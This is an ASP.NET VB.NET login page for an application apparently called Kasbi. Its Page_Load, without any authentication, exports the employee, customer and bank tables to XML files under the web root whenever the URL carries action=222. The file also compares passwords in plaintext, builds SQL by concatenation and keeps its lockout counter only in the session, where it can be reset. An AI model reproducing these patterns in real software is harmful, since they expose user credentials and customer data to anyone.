Imports System.Web.Security
Imports Kasbi.MSSqlDB

Namespace Kasbi


Partial Class Login
        Inherits PageBase

#Region " Web Form Designer Generated Code "

    'This call is required by the Web Form Designer.
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

        End Sub

        Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
            'CODEGEN: This method call is required by the Web Form Designer
            'Do not modify it using the code editor.
            InitializeComponent()
        End Sub

#End Region

        Public Overloads Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
            'Put user code to initialize the page here
            Session.CodePage = 1251
            Session.Timeout = 66666

            If (Session("wrong_enter")) >= 3 Then
                lblError.Text = "Вы 3 раза ввели неправильные данные. Доступ заблокирован."
                Exit Sub
            End If

            Dim action

            Try
                action = Integer.Parse(Request.QueryString("action"))
            Catch ex As Exception

            End Try

            If action = "222" Then
                export_user()
                export_allcustomers()
                export_bank()
                export_imns()
                export_city()
            End If

        End Sub

        Sub export_city()
            Try
                Dim cmd As SqlClient.SqlCommand
                Dim rs As SqlClient.SqlDataReader
                Dim f As IO.File
                Dim fs As IO.FileStream
                Dim i% = 0

                cmd = New SqlClient.SqlCommand("select * from City for xml auto")
                'cmd.CommandType = CommandType.StoredProcedure
                rs = dbSQL.GetReader(cmd)

                FileOpen(1, Server.MapPath("XML") & "\city.xml", OpenMode.Output, OpenAccess.Write, OpenShare.LockWrite)
                PrintLine(1, "<?xml version='1.0' encoding='windows-1251' ?>")
                PrintLine(1, "<goods>")
                While rs.Read
                    Print(1, rs(0))
                    i = i + 1
                End While
                PrintLine(1)
                PrintLine(1, "</goods>")

                FileClose(1)
                rs.Close()
            Catch
            End Try
        End Sub

        Sub export_bank()
            Try
                Dim cmd As SqlClient.SqlCommand
                Dim rs As SqlClient.SqlDataReader
                Dim f As IO.File
                Dim fs As IO.FileStream
                Dim i% = 0

                cmd = New SqlClient.SqlCommand("select * from bank for xml auto")
                'cmd.CommandType = CommandType.StoredProcedure
                rs = dbSQL.GetReader(cmd)

                FileOpen(1, Server.MapPath("XML") & "\bank.xml", OpenMode.Output, OpenAccess.Write, OpenShare.LockWrite)
                PrintLine(1, "<?xml version='1.0' encoding='windows-1251' ?>")
                PrintLine(1, "<goods>")
                While rs.Read
                    Print(1, rs(0))
                    i = i + 1
                End While
                PrintLine(1)
                PrintLine(1, "</goods>")

                FileClose(1)
                rs.Close()
            Catch
            End Try
        End Sub

        Sub export_imns()
            Try
                Dim cmd As SqlClient.SqlCommand
                Dim rs As SqlClient.SqlDataReader
                Dim f As IO.File
                Dim fs As IO.FileStream
                Dim i% = 0

                cmd = New SqlClient.SqlCommand("select * from IMNS for xml auto")
                'cmd.CommandType = CommandType.StoredProcedure
                rs = dbSQL.GetReader(cmd)

                FileOpen(1, Server.MapPath("XML") & "\imns.xml", OpenMode.Output, OpenAccess.Write, OpenShare.LockWrite)
                PrintLine(1, "<?xml version='1.0' encoding='windows-1251' ?>")
                PrintLine(1, "<goods>")
                While rs.Read
                    Print(1, rs(0))
                    i = i + 1
                End While
                PrintLine(1)
                PrintLine(1, "</goods>")

                FileClose(1)
                rs.Close()
            Catch
            End Try
        End Sub

        Sub export_user()
            Try
                Dim cmd As SqlClient.SqlCommand
                Dim rs As SqlClient.SqlDataReader
                Dim f As IO.File
                Dim fs As IO.FileStream
                Dim i% = 0

                cmd = New SqlClient.SqlCommand("select * from employee for xml auto")
                'cmd.CommandType = CommandType.StoredProcedure
                rs = dbSQL.GetReader(cmd)

                FileOpen(1, Server.MapPath("XML") & "\employee.xml", OpenMode.Output, OpenAccess.Write, OpenShare.LockWrite)
                PrintLine(1, "<?xml version='1.0' encoding='windows-1251' ?>")
                PrintLine(1, "<goods>")
                While rs.Read
                    Print(1, rs(0))
                    i = i + 1
                End While
                PrintLine(1)
                PrintLine(1, "</goods>")

                FileClose(1)
                rs.Close()
            Catch
            End Try
        End Sub

        Sub export_allcustomers()
            Try
                Dim cmd As SqlClient.SqlCommand
                Dim rs As SqlClient.SqlDataReader
                Dim f As IO.File
                Dim fs As IO.FileStream
                Dim i% = 0

                cmd = New SqlClient.SqlCommand("select * from customer for xml auto")
                'cmd.CommandType = CommandType.StoredProcedure
                rs = dbSQL.GetReader(cmd)

                FileOpen(1, Server.MapPath("XML") & "\allcustomers.xml", OpenMode.Output, OpenAccess.Write, OpenShare.LockWrite)
                PrintLine(1, "<?xml version='1.0' encoding='windows-1251' ?>")
                PrintLine(1, "<goods>")
                While rs.Read
                    Print(1, rs(0))
                    i = i + 1
                End While
                PrintLine(1)
                PrintLine(1, "</goods>")

                FileClose(1)
                rs.Close()
            Catch
            End Try
        End Sub

        Private Overloads Sub btnLogin_Click(ByVal sender As System.Object, ByVal e As System.Web.UI.ImageClickEventArgs) Handles btnLogin.Click
            Dim cmd As SqlClient.SqlCommand
            Dim adapter As SqlClient.SqlDataAdapter
            Dim ds As DataSet


            If (Session("wrong_enter")) >= 3 Then
                lblError.Text = "Вы 3 раза ввели неправильные данные. Доступ заблокирован."
                Exit Sub
            End If

            Try
                cmd = New SqlClient.SqlCommand("Login")
                cmd.CommandType = CommandType.StoredProcedure
                cmd.Parameters.AddWithValue("@pi_login", txtLoginUser.Text)
                adapter = dbSQL.GetDataAdapter(cmd)
                ds = New DataSet
                adapter.Fill(ds)

                If ds.Tables(0).Rows.Count <> 0 Then
                    If CStr(ds.Tables(0).Rows(0).Item("password")) = txtLoginPassword.Text Then
                        Session("USER") = New CUser()

                        CType(Session("USER"), CUser).FillData(ds.Tables(0).Rows(0))
                        Dim rules = dbSQL.ExecuteScalar("SELECT rules FROM employee WHERE sys_id='" & CurrentUser.sys_id & "'")
                        If IsDBNull(rules) Then

                        Else
                            rules = Split(rules, ";")
                            Session("rule0") = rules(0)
                            Session("rule1") = rules(1)
                            Session("rule2") = rules(2)
                            Session("rule3") = rules(3)
                            Session("rule4") = rules(4)
                            Session("rule5") = rules(5)
                            Session("rule6") = rules(6)
                            Session("rule7") = rules(7)
                            Session("rule8") = rules(8)
                            Session("rule9") = rules(9)
                            Session("rule10") = rules(10)
                            Session("rule11") = rules(11)
                            Session("rule12") = rules(12)
                            Session("rule13") = rules(13)
                            Session("rule14") = rules(14)
                            Session("rule15") = rules(15)
                            Session("rule16") = rules(16)
                            Session("rule17") = rules(17)
                            Session("rule18") = rules(18)
                            Session("rule19") = rules(19)
                            Session("rule20") = rules(20)
                            Session("rule21") = rules(21)
                            Session("rule22") = rules(22)
                            Session("rule23") = rules(23)
                            Session("rule24") = rules(24)
                            Session("rule25") = rules(25)
                            Session("rule26") = rules(26)
                            Session("rule27") = rules(27)
                            Try
                                Session("rule28") = rules(28)
                            Catch ex As Exception
                                Session("rule28") = ""
                            End Try

                        End If

                        FormsAuthentication.RedirectFromLoginPage("*", True)
                    Else
                        lblError.Text = "Ошибка введенных данных! Попробуйте еще раз.<br>" & Err.Description
                        'если неправильно пароль воодит, указываем в сессии
                        Session("wrong_enter") += 1
                        Exit Sub
                    End If
                Else
                    lblError.Text = "Ошибка получения информации!<br>" & Err.Description
                    'если неправильно пароль воодит, указываем в сессии
                    Session("wrong_enter") += 1
                    Exit Sub
                End If
            Catch
                lblError.Text = "Ошибка получения информаци!<br>" & Err.Description
                'если неправильно пароль воодит, указываем в сессии
                Session("wrong_enter") += 1
                Exit Sub
            End Try
        End Sub
    End Class

End Namespace
